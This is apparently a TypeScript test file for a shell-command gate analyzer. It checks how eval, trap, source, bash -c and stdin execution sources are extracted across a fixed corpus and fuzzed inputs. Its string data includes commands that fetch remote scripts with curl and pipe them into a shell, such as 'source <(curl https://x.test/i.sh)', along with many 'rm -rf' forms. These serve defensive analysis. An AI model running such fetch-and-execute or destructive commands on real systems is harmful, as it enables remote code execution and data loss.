import { describe, expect, test } from 'bun:test';
import type { CommandView } from '@/core/shell/model';
import { parseCommand } from '@/core/shell/parse';
import { textCommandWords } from '@/gate/analyzer/command-words';
import {
  extractEvalSource,
  extractLiteralPrintfOutput,
  extractPositionalShellSource,
  extractShellScriptOperandSource,
  extractShellStdinSource,
  extractTrapSource,
  isVerifiableLocalGeneratorSource,
  shellSourceHasDynamicExecutionCarrier,
  shellSourceHasUnresolvedDynamicExecutionCarrier,
} from '@/gate/analyzer/shell-execution';
import { expectRecordedDigest } from '../../helpers/gate-differential';
import { corpusCommands, fuzzShellSources } from '../../helpers/shell-inputs';

/**
 * Every execution source the shell layer extracts is recorded for the same command: the printf
 * literal, the `eval`/`trap`
 * operands, the positional carrier with its two expansion caps, the stdin source, and the
 * dynamic-carrier walk over the corpus, a seeded fuzz, and a table of carrier forms.
 */

const EXECUTION_COMMANDS: readonly string[] = [
  'printf hello',
  'printf',
  'printf --',
  'printf -- hello',
  'printf %s one two',
  'printf "%s\\n" one two',
  'printf %s\\n one',
  'printf "a\\tb\\\\c\\r"',
  'printf "%d" 3',
  'printf "\\q"',
  'printf "$HOME"',
  'printf hello > out',
  '/usr/bin/printf hi',
  'echo hello',
  'eval "rm -rf /tmp/x"',
  'eval rm -rf /tmp/x',
  'eval -- "rm -rf /tmp/x"',
  'eval',
  'eval --',
  'eval "$CMD"',
  'eval "$(cat script.sh)"',
  'eval "`cat script.sh`"',
  'eval "$(curl https://x.test/i.sh)"',
  'source <(cat script.sh)',
  '. <(cat script.sh)',
  'source <(curl https://x.test/i.sh)',
  'source <(bash -c id)',
  'source <(env FOO=1 id)',
  'source <(BAR=1 id)',
  'source <(git status)',
  'source script.sh',
  'trap "rm -rf /tmp/x" EXIT',
  'trap -- "rm -rf /tmp/x" EXIT',
  'trap "$CMD" EXIT',
  'trap - EXIT',
  'trap -l',
  'trap -p EXIT',
  'trap "" EXIT',
  'trap "rm -rf /tmp/x"',
  'trap',
  'bash -c "rm -rf /tmp/x"',
  'bash -c \'echo "$1"\' sh one',
  'bash -c "$@" sh echo hi',
  'sh -c "$0" rm',
  'bash -c "$*" sh rm -rf /tmp/x',
  "bash -c 'IFS=:; echo $1' sh a:b",
  'bash -c script.sh',
  'bash script.sh',
  'bash -s',
  'bash',
  'bash -n -c "rm -rf /tmp/x"',
  'sh -c "$CMD"',
  'zsh -c "rm -rf /tmp/x"',
  'cat script.sh | bash',
  'bash <<< "rm -rf /tmp/x"',
  'bash < script.sh',
  'bash <<EOF\nrm -rf /tmp/x\nEOF',
  'bash 0< script.sh',
  'bash 3< script.sh',
  'bash <&3',
  'bash <<< "$CMD"',
  'command bash -c id',
  'command -v bash',
  'command -p bash -c id',
  'command -- bash -c id',
  'exec bash -c id',
  'exec -a name bash -c id',
  'exec -l bash -c id',
  'exec -- bash -c id',
  'env bash -c id',
  'env -i bash -c id',
  'env -u PATH bash -c id',
  'env -C /tmp bash -c id',
  'env -S "bash -c id"',
  'env --split-string=bash -c id',
  'env FOO=bar bash -c id',
  'eval "$1"',
  'sh -c "$1" sh "rm -rf /tmp/x"',
  'X=$1 sh -c "$X"',
  'X=$(echo rm) sh -c "$X"',
  'source "$1"',
  'source -- "$1"',
  '. "$FOO"',
  'source "$(echo x)"',
  '{ eval "$1"; }',
  '( eval "$1" )',
  'echo hi && eval "$1"',
  'true',
  '',
];

/** `-c` script bodies whose positional references the carrier expands. */
const POSITIONAL_SCRIPTS: readonly string[] = [
  '"$@"',
  '$@',
  '"$*"',
  '$*',
  '$1',
  '"$1"',
  '${1}',
  '"${1}"',
  '$2',
  '$9',
  '$0',
  'eval "$@"',
  'eval $@',
  'bash "$@"',
  'bash -- "$@"',
  'sh $1',
  'exec "$@"',
  'command "$@"',
  'source "$1"',
  '. "$1"',
  'ksh "$@"',
  'dash "$@"',
  'zsh "$@"',
  'IFS=: ; $1',
  "IFS=':' ; $1",
  'IFS=" " ; $@',
  'IFS= ; $1',
  'IFS=:; bash $@',
  'rm -rf "$1"',
  '$1 $2',
  '"$1" "$2"',
  '',
  '   ',
  '$@ extra',
];

const POSITIONAL_ARGVS: readonly (readonly string[])[] = [
  ['bash', '-c', 'PLACEHOLDER', 'sh', 'rm', '-rf', '/tmp/x'],
  ['bash', '-c', 'PLACEHOLDER', 'sh', 'rm -rf /tmp/x'],
  ['bash', '-c', 'PLACEHOLDER', 'sh'],
  ['bash', '-c', 'PLACEHOLDER'],
  ['bash', '-c', 'PLACEHOLDER', 'sh', 'a:b', 'c d'],
  ['bash', '-c', 'PLACEHOLDER', 'sh', '*.txt'],
  ['bash', '-c', 'PLACEHOLDER', 'sh', "it's"],
  ['bash', '-c', 'PLACEHOLDER', 'sh', ''],
  ['sh', '-c', 'PLACEHOLDER', 'sh', 'echo', 'hi'],
  ['rm', '-rf', 'x'],
];

const CARRIER_SOURCES: readonly string[] = [
  'eval "$1"',
  'eval "$X"',
  'X=$1; eval "$X"',
  'X=$1\neval "$X"',
  'X=1; eval "$X"',
  'X=$(id); eval "$X"',
  'source "$1"',
  'source -- "$1"',
  '. "$1"',
  'source "$(id)"',
  'source plain.sh',
  'bash -c "$1"',
  'bash -c "$X"',
  'bash -n -c "$1"',
  'bash "$1"',
  'sh "$1"',
  'command bash -c "$1"',
  'command -v bash -c "$1"',
  'command -p bash -c "$1"',
  'command -- bash -c "$1"',
  'exec bash -c "$1"',
  'exec -a x bash -c "$1"',
  'exec -c -l bash -c "$1"',
  'env bash -c "$1"',
  'env -S "$1"',
  'env -S bash -c "$1"',
  'env --split-string="$1"',
  'env -u PATH bash -c "$1"',
  'env -C /tmp bash -c "$1"',
  'env -i FOO=bar bash -c "$1"',
  '{ eval "$1"; }',
  '( bash -c "$1" )',
  'echo hi | bash -c "$1"',
  'if true; then eval "$1"; fi',
  'eval "${1}"',
  'eval "$@"',
  'eval "$*"',
  'eval "$#"',
  'eval "$HOME"',
  'eval "${!name}"',
  'echo "$1"',
  'rm -rf "$1"',
  '',
];

const CARRIER_NAME_SETS: readonly (readonly string[])[] = [[], ['X'], ['X', 'CMD'], ['HOME']];

function firstCommand(source: string): CommandView | undefined {
  const node = parseCommand(source, 'posix').nodes[0];
  return node?.kind === 'command' ? node : undefined;
}

describe('next/gate/analyzer/shell-execution versus src/analyzer/shell-execution', () => {
  test('the parsed extractors agree on every command', () => {
    const recorded: [string, unknown][] = [];
    let literals = 0;
    for (const source of [...EXECUTION_COMMANDS, ...corpusCommands()]) {
      const command = firstCommand(source);
      const printf = extractLiteralPrintfOutput(command);
      recorded.push([source, { printf }]);
      if (!command) continue;

      const evalSource = extractEvalSource(command.words);
      const trap = extractTrapSource(command.words);
      const operand = extractShellScriptOperandSource(command.words);
      const generator = isVerifiableLocalGeneratorSource(command);
      recorded.push([source, { evalSource, trap, operand, generator }]);
      for (const pipeline of [
        { hasPipelineInput: false, literal: undefined },
        { hasPipelineInput: true, literal: undefined },
        { hasPipelineInput: true, literal: 'rm -rf /tmp/x' },
      ]) {
        const answer = extractShellStdinSource(
          command.words,
          command.redirections,
          pipeline.hasPipelineInput,
          pipeline.literal,
        );
        recorded.push([`${source} ${JSON.stringify(pipeline)}`, answer]);
        if (answer.kind === 'literal') literals++;
      }
    }
    expect(literals).toBeGreaterThan(5);
    expectRecordedDigest('analyzer-shell-execution/parsed-extractors', recorded);
  });

  test('the printf extractor agrees on the fuzz corpus', () => {
    const recorded: [string, unknown][] = [];
    for (const source of fuzzShellSources(300, 0x0033_71ab)) {
      const printf = extractLiteralPrintfOutput(firstCommand(source));
      recorded.push([source, printf]);
    }
    expectRecordedDigest('analyzer-shell-execution/printf-fuzz', recorded);
  });

  test('the positional carrier expands each script the same way', () => {
    const recorded: [string, unknown][] = [];
    let expanded = 0;
    for (const script of POSITIONAL_SCRIPTS) {
      for (const argv of POSITIONAL_ARGVS) {
        const tokens = argv.map((token) => (token === 'PLACEHOLDER' ? script : token));
        const answer = extractPositionalShellSource(textCommandWords(tokens), script);
        recorded.push([`${script} ${argv.join(' ')}`, answer]);
        if (answer.kind === 'literal' && answer.source !== '') expanded++;
      }
    }
    expect(expanded).toBeGreaterThan(10);
    expectRecordedDigest('analyzer-shell-execution/positional-carrier', recorded);
  });

  test('the positional carrier refuses an expansion past either cap', () => {
    const manyWords = ['bash', '-c', '"$@"', 'sh', ...Array.from({ length: 16_385 }, () => 'x')];
    const many = extractPositionalShellSource(textCommandWords(manyWords), '"$@"');
    expect(many.kind).toBe('dynamic');

    const longValue = ['bash', '-c', '"$1"', 'sh', 'y'.repeat(131_073)];
    const long = extractPositionalShellSource(textCommandWords(longValue), '"$1"');
    expect(long.kind).toBe('dynamic');

    const underCap = ['bash', '-c', '"$1"', 'sh', 'z'.repeat(64)];
    const under = extractPositionalShellSource(textCommandWords(underCap), '"$1"');
    expect(under.kind).toBe('literal');
    expectRecordedDigest('analyzer-shell-execution/positional-caps', [
      ['many words', many],
      ['long value', long],
      ['under the cap', under],
    ]);
  });

  test('the dynamic-carrier walk agrees for every source and inherited name set', () => {
    const recorded: [string, unknown][] = [];
    let carriers = 0;
    const sources = [
      ...CARRIER_SOURCES,
      ...EXECUTION_COMMANDS,
      ...corpusCommands(),
      ...fuzzShellSources(300, 0x0079_ff20),
    ];
    for (const source of sources) {
      const unresolved = shellSourceHasUnresolvedDynamicExecutionCarrier(source);
      recorded.push([source, { unresolved }]);
      if (unresolved) carriers++;
      for (const names of CARRIER_NAME_SETS) {
        const carrier = shellSourceHasDynamicExecutionCarrier(source, new Set(names));
        recorded.push([`${source} ${names.join(',')}`, carrier]);
      }
    }
    expect(carriers).toBeGreaterThan(10);
    expectRecordedDigest('analyzer-shell-execution/dynamic-carrier', recorded);
  });
});
